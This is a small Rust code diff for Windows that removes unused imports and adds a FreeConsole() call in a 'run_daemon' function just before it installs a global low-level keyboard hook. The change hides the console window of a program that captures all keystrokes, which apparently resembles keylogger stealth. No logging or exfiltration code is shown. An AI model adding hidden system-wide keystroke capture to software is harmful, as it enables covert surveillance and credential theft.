@@ -1,9 +1,7 @@
 use std::{
-    ffi::CString,
     ffi::OsString,
     mem::{size_of, zeroed},
     os::windows::ffi::OsStringExt,
-    thread, time,
 };
 
 use winapi::{
@@ -175,6 +173,7 @@ unsafe fn run_daemon() {
         }
     }
 
+    FreeConsole();
     let h_instance = GetModuleHandleA(0 as LPCSTR);
     let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_hook_proc), h_instance, 0);
 
